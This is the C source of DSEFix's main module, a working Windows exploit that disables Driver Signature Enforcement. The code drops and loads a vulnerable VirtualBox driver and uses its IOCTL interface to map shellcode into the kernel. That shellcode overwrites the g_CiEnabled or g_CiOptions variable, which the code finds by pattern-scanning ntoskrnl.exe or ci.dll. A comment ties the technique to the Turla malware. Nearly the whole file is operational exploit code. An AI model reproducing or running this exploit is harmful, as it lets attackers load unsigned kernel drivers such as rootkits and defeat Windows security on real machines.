/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.22
*
*  DATE:        01 Dec 2017
*
*  Codename: Aoba
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "vboxdrv.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HINSTANCE  g_hInstance;
HANDLE     g_ConOut = NULL;
HANDLE     g_hVBox = INVALID_HANDLE_VALUE;
BOOL       g_ConsoleOutput = FALSE;
BOOL       g_VBoxInstalled = FALSE;
WCHAR      g_BE = 0xFEFF;

RTL_OSVERSIONINFOW g_osv;


#define VBoxDrvSvc      TEXT("VBoxDrv")
#define supImageName    "aoba"
#define supImageHandle  0x1a000

// we don't care about modified Windows startup

#define NTOSKRNL_EXE    "ntoskrnl.exe"
#define CI_DLL          "ci.dll"

#define T_PROGRAMTITLE   TEXT("DSEFix v1.2.2 (01 Dec 2017)")
#define T_PROGRAMUNSUP   TEXT("Unsupported WinNT version\r\n")
#define T_PROGRAMRUN     TEXT("Another instance running, close it before\r\n")
#define T_PROGRAMUSAGE   TEXT("Usage: dsefix [-e]\r\n")
#define T_PROGRAMINTRO   TEXT("DSEFix v1.2.2 started\r\n(c) 2014 - 2017 DSEFix Project\r\nSupported x64 OS : 7 and above\r\n")

/*
**  Disable DSE (Vista and above)
**  xor rax, rax
**  ret
*/
const unsigned char scDisable[] = {
    0x48, 0x31, 0xc0, 0xc3
};

/*
**  Enable DSE (Vista and Seven)
**  xor rax, rax
**  mov al, 1
**  ret
*/
const unsigned char scEnableVista7[] = {
    0x48, 0x31, 0xc0, 0xb0, 0x01, 0xc3
};

/*
**  Enable DSE (W8 and above)
**  xor rax, rax
**  mov al, 6
**  ret
*/
const unsigned char scEnable8Plus[] = {
    0x48, 0x31, 0xc0, 0xb0, 0x06, 0xc3
};


/*
* RunExploit
*
* Purpose:
*
* Execute VirtualBox exploit used by WinNT/Turla.
*
*/
void RunExploit(
    _In_ ULONG_PTR g_CiAddress,
    _In_ LPVOID Shellcode,
    _In_ ULONG CodeSize
)
{
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0, BufferSize;
    RTR0PTR         ImageBase = NULL;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;
    WCHAR           text[256];

    while (g_hVBox != INVALID_HANDLE_VALUE) {

        BufferSize = CodeSize + 0x1000;

        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_COOKIE call failed"), g_ConsoleOutput, TRUE);
            break;
        }

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = BufferSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_OPEN call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: OpenLdr.u.Out.pvImageBase = 0x"));
            u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = BufferSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), &pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + BufferSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, BufferSize - 0x1000);
        pLoadTask->u.In.cbImage = BufferSize;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_LOAD call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("Ldr: SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase, _strend(text));
            _strcat(text, TEXT(", size = 0x"));
            ultohex(CodeSize, _strend(text));
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed"), g_ConsoleOutput, TRUE);
            break;
        }
        else {
            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete"), g_ConsoleOutput, TRUE);
        }

        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_FAST_DO_NOP"), g_ConsoleOutput, TRUE);

        _strcpy(text, TEXT("Ldr: Modifying value at address 0x"));
        u64tohex((ULONG_PTR)g_CiAddress, _strend(text));
        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);

        DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
            (LPVOID)g_CiAddress, 0,
            (LPVOID)g_CiAddress, 0,
            &bytesIO, NULL);

        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_FREE"), g_ConsoleOutput, TRUE);

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

        break;
    }

    if (pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &pLoadTask, &memIO, MEM_RELEASE);
    }

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }
}

/*
* IsVBoxInstalled
*
* Purpose:
*
* Check VirtualBox software installation state.
*
*/
BOOL IsVBoxInstalled(
    VOID
)
{
    BOOL     bPresent = FALSE;
    LRESULT  lRet;
    HKEY     hKey = NULL;

    lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"),
        0, KEY_READ, &hKey);

    bPresent = (hKey != NULL);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bPresent;
}

/*
* StartVulnerableDriver
*
* Purpose:
*
* Load vulnerable virtualbox driver and return handle for it device.
*
*/
HANDLE StartVulnerableDriver(
    VOID
)
{
    BOOL        bCond = FALSE;
    PBYTE       DrvBuffer;
    ULONG       DataSize = 0, bytesIO;
    HANDLE      hDevice = INVALID_HANDLE_VALUE;
    WCHAR       szDriverFileName[MAX_PATH * 2];
    SC_HANDLE   schSCManager = NULL;
    LPWSTR      msg;

    DrvBuffer = VBoxDrv;
    DataSize = sizeof(VBoxDrv);

    do {

        RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
        if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {

            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"),
                g_ConsoleOutput, TRUE);

            break;
        }

        schSCManager = OpenSCManager(NULL,
            NULL,
            SC_MANAGER_ALL_ACCESS
        );
        if (schSCManager == NULL) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error opening SCM database"),
                g_ConsoleOutput, TRUE);

            break;
        }

        //
        // Lookup main vbox driver device,
        // if found then try to unload all possible vbox drivers,
        // where unload order is sensitive because some vbox drivers depends on each other.
        //
        if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Active VirtualBox found in system, attempt unload it"),
                g_ConsoleOutput, TRUE);

            if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxNetAdp driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxNetLwf driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxUSBMon driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
            Sleep(1000);
            if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
                cuiPrintText(g_ConOut,
                    TEXT("SCM: VBoxDrv driver unloaded"),
                    g_ConsoleOutput, TRUE);
            }
        }

        //if vbox installed backup it driver, do it before dropping our
        if (g_VBoxInstalled) {
            if (supBackupVBoxDrv(FALSE) == FALSE) {
                cuiPrintText(g_ConOut,
                    TEXT("Ldr: Error while doing VirtualBox driver backup"),
                    g_ConsoleOutput, TRUE);

                break;
            }
        }

        //drop our vboxdrv version
        _strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
        bytesIO = (ULONG)supWriteBufferToFile(
            szDriverFileName,
            DrvBuffer,
            (SIZE_T)DataSize);

        if (bytesIO != DataSize) {

            cuiPrintText(g_ConOut,
                TEXT("Ldr: Error writing VirtualBox on disk"),
                g_ConsoleOutput, TRUE);

            break;
        }

        //if vbox not found in system install driver in scm
        if (g_VBoxInstalled == FALSE) {
            scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
        }

        //run driver
        if (scmStartDriver(schSCManager, VBoxDrvSvc) != FALSE) {

            if (scmOpenDevice(VBoxDrvSvc, &hDevice))
                msg = TEXT("SCM: Vulnerable driver loaded and opened");
            else
                msg = TEXT("SCM: Driver device open failure");

        }
        else {
            msg = TEXT("SCM: Vulnerable driver load failure");
        }

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

    } while (bCond);

    //post cleanup
    if (schSCManager != NULL) {
        CloseServiceHandle(schSCManager);
    }
    return hDevice;
}

/*
* StopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver. If VirtualBox installed - restore original driver.
*
*/
void StopVulnerableDriver(
    VOID
)
{
    SC_HANDLE	       schSCManager;
    LPWSTR             msg;
    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    cuiPrintText(g_ConOut,
        TEXT("SCM: Unloading vulnerable driver"),
        g_ConsoleOutput, TRUE);

    if (g_hVBox != INVALID_HANDLE_VALUE)
        CloseHandle(g_hVBox);

    schSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS
    );

    if (schSCManager == NULL) {
        cuiPrintText(g_ConOut,
            TEXT("SCM: Cannot open database, unable unload driver"),
            g_ConsoleOutput, TRUE);
        return;
    }

    //stop driver in any case
    if (scmStopDriver(schSCManager, VBoxDrvSvc))
        msg = TEXT("SCM: Vulnerable driver successfully unloaded");
    else
        msg = TEXT("SCM: Unexpected error while unloading driver");

    cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

    //if VBox not installed - remove from scm database and delete file
    if (g_VBoxInstalled == FALSE) {

        if (scmRemoveDriver(schSCManager, VBoxDrvSvc))
            msg = TEXT("SCM: Driver entry removed from registry");
        else
            msg = TEXT("SCM: Error removing driver entry from registry");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            msg = TEXT("Ldr: Driver file removed");
        else
            msg = TEXT("Ldr: Error removing driver file");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);

    }
    else {
        //VBox software present, restore original driver and exit
        if (supBackupVBoxDrv(TRUE))
            msg = TEXT("Ldr: Original driver restored");
        else
            msg = TEXT("Ldr: Unexpected error while restoring original driver");

        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
    }
    CloseServiceHandle(schSCManager);
}

/*
* QueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address.
*
*/
LONG QueryCiEnabled(
    _In_ PVOID MappedBase,
    _In_ SIZE_T SizeOfImage,
    _Inout_ ULONG_PTR *KernelBase
)
{
    SIZE_T  c;
    LONG    rel = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)MappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)MappedBase + c + 4);
            *KernelBase = *KernelBase + c + 8 + rel;
            break;
        }
    }

    return rel;
}

/*
* QueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
*
*/
LONG QueryCiOptions(
    _In_ PVOID MappedBase,
    _Inout_ ULONG_PTR *KernelBase
)
{
    PBYTE        CiInitialize = NULL;
    ULONG        c, j = 0;
    LONG         rel = 0;
    hde64s hs;

    CiInitialize = (PBYTE)GetProcAddress(MappedBase, "CiInitialize");
    if (CiInitialize == NULL)
        return 0;

    if (g_osv.dwBuildNumber > 16199) {

        c = 0;
        j = 0;
        do {

            /* call CipInitialize */
            if (CiInitialize[c] == 0xE8)
                j++;

            if (j > 1) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }

            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }
    else {

        c = 0;
        do {

            /* jmp CipInitialize */
            if (CiInitialize[c] == 0xE9) {
                rel = *(PLONG)(CiInitialize + c + 1);
                break;
            }
            hde64_disasm(CiInitialize + c, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (c < 256);

    }

    CiInitialize = CiInitialize + c + 5 + rel;
    c = 0;
    do {

        if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
            rel = *(PLONG)(CiInitialize + c + 2);
            break;
        }
        hde64_disasm(CiInitialize + c, &hs);
        if (hs.flags & F_ERROR)
            break;
        c += hs.len;

    } while (c < 256);

    CiInitialize = CiInitialize + c + 6 + rel;

    *KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

    return rel;
}

/*
* QueryVariableAddress
*
* Purpose:
*
* Find variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR QueryVariableAddress(
    VOID
)
{
    LONG rel = 0;
    SIZE_T SizeOfImage = 0;
    ULONG_PTR Result = 0, ModuleKernelBase = 0;
    CHAR *szModuleName;
    WCHAR *wszErrorEvent, *wszSuccessEvent;
    PVOID MappedBase = NULL;

    CHAR szFullModuleName[MAX_PATH * 2];

    if (g_osv.dwBuildNumber < 9200) {
        szModuleName = NTOSKRNL_EXE;
        wszErrorEvent = TEXT("Ldr: ntoskrnl.exe loaded image base not recognized");
        wszSuccessEvent = TEXT("Ldr: ntoskrnl.exe loaded for pattern search");
    }
    else {
        szModuleName = CI_DLL;
        wszErrorEvent = TEXT("Ldr: CI.dll loaded image base not recognized");
        wszSuccessEvent = TEXT("Ldr: CI.dll loaded for pattern search");
    }

    ModuleKernelBase = supGetModuleBaseByName(szModuleName);
    if (ModuleKernelBase == 0) {
        cuiPrintText(g_ConOut,
            wszErrorEvent,
            g_ConsoleOutput, TRUE);
        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
        return 0;
    _strcat_a(szFullModuleName, "\\");
    _strcat_a(szFullModuleName, szModuleName);

    MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (MappedBase) {

        cuiPrintText(g_ConOut,
            wszSuccessEvent,
            g_ConsoleOutput, TRUE);

        if (g_osv.dwBuildNumber < 9200) {
            rel = QueryCiEnabled(
                MappedBase,
                SizeOfImage,
                &ModuleKernelBase);

        }
        else {
            rel = QueryCiOptions(
                MappedBase,
                &ModuleKernelBase);
        }

        if (rel != 0) {
            Result = ModuleKernelBase;
        }
        FreeLibrary(MappedBase);
    }
    else {

        //
        // Output error.
        //
        if (g_osv.dwBuildNumber < 9200) {
            wszErrorEvent = TEXT("Ldr: Cannot load ntoskrnl.exe");
        }
        else {
            wszErrorEvent = TEXT("Ldr: Cannot load CI.dll");
        }
        cuiPrintText(g_ConOut,
            wszErrorEvent,
            g_ConsoleOutput, TRUE);
    }

    return Result;
}

/*
* ProcessCommandLine
*
* Purpose:
*
* Extract input command, select shellcode, patch kernel memory.
*
*/
UINT ProcessCommandLine(
    _In_ LPWSTR lpCommandLine
)
{
    BOOLEAN     bEnable = FALSE;
    UINT        retVal = (UINT)-1;
    ULONG       c, CodeSize;
    PVOID       CodePtr = NULL;
    ULONG_PTR   g_CiAddress = 0;

    WCHAR szBuffer[MAX_PATH + 1];

    //
    // Command line options.
    //
    c = 0;
    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szBuffer, MAX_PATH, &c);

    //
    // Check "enable" command.
    //
    if (c > 0) {
        if (_strcmpi(szBuffer, TEXT("-e")) == 0) {
            bEnable = TRUE;
        }
    }

    g_CiAddress = QueryVariableAddress();
    if (g_CiAddress == 0) {
        cuiPrintText(g_ConOut,
            TEXT("Ldr: Cannot query address for patch"),
            g_ConsoleOutput, TRUE);
        return retVal;
    }

    //
    // Select proper shellcode buffer
    //
    if (bEnable) {

        cuiPrintText(g_ConOut,
            TEXT("Ldr: DSE will be (re)enabled"),
            g_ConsoleOutput, TRUE);

        if (g_osv.dwBuildNumber < 9200) {
            //
            // Shellcode for vista, 7
            //
            CodePtr = (PVOID)scEnableVista7;
            CodeSize = sizeof(scEnableVista7);
        }
        else {
            //
            // Shellcode for for 8/10+
            //
            CodePtr = (PVOID)scEnable8Plus;
            CodeSize = sizeof(scEnable8Plus);
        }
    }
    else {
        cuiPrintText(g_ConOut,
            TEXT("Ldr: DSE will be disabled"),
            g_ConsoleOutput, TRUE);

        CodePtr = (PVOID)scDisable;
        CodeSize = sizeof(scDisable);
    }

    g_hVBox = StartVulnerableDriver();
    if (g_hVBox != INVALID_HANDLE_VALUE) {
        RunExploit(g_CiAddress, CodePtr, CodeSize);
        StopVulnerableDriver();
    }

    return retVal;
}

/*
* DSEFixMain
*
* Purpose:
*
* Program main.
*
*/
void DSEFixMain()
{
    BOOL bCond = FALSE;
    LONG x;
    UINT uResult = 0;
    DWORD dwTemp;
    WCHAR text[256];

    __security_init_cookie();

    do {
        g_hInstance = GetModuleHandle(NULL);
        g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (g_ConOut == INVALID_HANDLE_VALUE) {
            uResult = (UINT)-1;
            break;
        }
        g_ConsoleOutput = TRUE;
        if (!GetConsoleMode(g_ConOut, &dwTemp)) {
            g_ConsoleOutput = FALSE;
        }
        SetConsoleTitle(T_PROGRAMTITLE);
        SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);
        if (g_ConsoleOutput == FALSE) {
            WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &dwTemp, NULL);
        }

        cuiPrintText(g_ConOut,
            T_PROGRAMINTRO,
            g_ConsoleOutput, TRUE);

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            cuiPrintText(g_ConOut,
                T_PROGRAMRUN,
                g_ConsoleOutput, TRUE);
            uResult = (UINT)-1;
            break;
        }

        //check version first
        RtlSecureZeroMemory(&g_osv, sizeof(g_osv));
        g_osv.dwOSVersionInfoSize = sizeof(g_osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&g_osv);
        if (g_osv.dwMajorVersion < 6) {
            cuiPrintText(g_ConOut,
                T_PROGRAMUNSUP,
                g_ConsoleOutput, TRUE);
            uResult = (UINT)-1;
            break;
        }

        _strcpy(text, TEXT("Ldr: Windows v"));
        ultostr(g_osv.dwMajorVersion, _strend(text));
        _strcat(text, TEXT("."));
        ultostr(g_osv.dwMinorVersion, _strend(text));
        _strcat(text, TEXT(" build "));
        ultostr(g_osv.dwBuildNumber, _strend(text));
        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);

        if (g_osv.dwBuildNumber > 9200) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Warning, improved PatchGuard version present"),
                g_ConsoleOutput, TRUE);
            if (g_osv.dwBuildNumber > 10240) {
                cuiPrintText(g_ConOut,
                    TEXT("Ldr: Modification of data region will lead to delayed BSOD"),
                    g_ConsoleOutput, TRUE);
            }
        }

        //
        // If VirtualBox installed on the same machine warn user,
        // however this is unnecessary can lead to any conflicts.
        //
        g_VBoxInstalled = IsVBoxInstalled();
        if (g_VBoxInstalled) {
            cuiPrintText(g_ConOut,
                TEXT("Ldr: Warning VirtualBox software installed, conflicts are possible"),
                g_ConsoleOutput, TRUE);
        }

        uResult = ProcessCommandLine(GetCommandLine());

        cuiPrintText(g_ConOut,
            TEXT("Ldr: Exit"),
            g_ConsoleOutput, TRUE);

    } while (bCond);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(uResult);
}
